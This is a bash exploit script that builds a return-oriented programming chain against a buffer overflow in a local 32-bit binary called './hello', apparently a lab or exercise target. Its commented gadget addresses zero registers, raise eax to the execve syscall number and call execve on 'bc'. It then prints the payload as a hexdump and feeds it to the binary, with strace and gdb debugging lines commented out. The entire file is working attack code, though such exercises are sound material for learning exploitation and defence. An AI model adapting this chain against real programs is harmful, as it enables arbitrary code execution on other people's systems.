#! /bin/bash

P=1234567890123456789012  # padding
P=${P}$'\x23\xcf\x05\x08' # zero edx and eax
P=${P}'This is padding.'  # that was padding
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xf9\xc0\x07\x08' # increment eax
P=${P}$'\xd2\xec\x06\x08' # load parameters
P=${P}$'\xd4\xba\x04\x08' # pointer to NULL
P=${P}$'\xde\xe4\x0b\x08' # pointer to "bc"
P=${P}$'\x0f\xf6\x06\x08' # system call

echo "PAYLOAD:"
echo -n "$P" | hexdump -C
## uncomment these lines for debugging
#strace -i ./hello "$P"
#gdb -q ./hello -ex "run '$P'"
./hello $P

